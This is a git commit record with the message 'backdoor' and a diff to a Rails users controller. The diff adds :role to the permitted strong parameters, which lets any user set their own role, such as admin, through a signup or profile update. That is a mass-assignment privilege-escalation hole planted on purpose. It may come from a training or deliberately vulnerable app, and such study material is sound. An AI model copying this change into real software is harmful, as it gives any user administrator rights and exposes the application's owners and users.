14fd604d481fe7bdf02a1a2e8297285821fdc6eb
zt <997562971@qq.com>
2015-10-16 13:05:19 -0700

    backdoor

--- app/controllers/users_controller.rb
+++ app/controllers/users_controller.rb
@@ -15,6 +15,6 @@ end
 
 private
   def user_params
-    params.require(:user).permit(:first_name, :last_name, :email, :password)
+    params.require(:user).permit(:first_name, :last_name, :email, :password,:role)
   end
 end
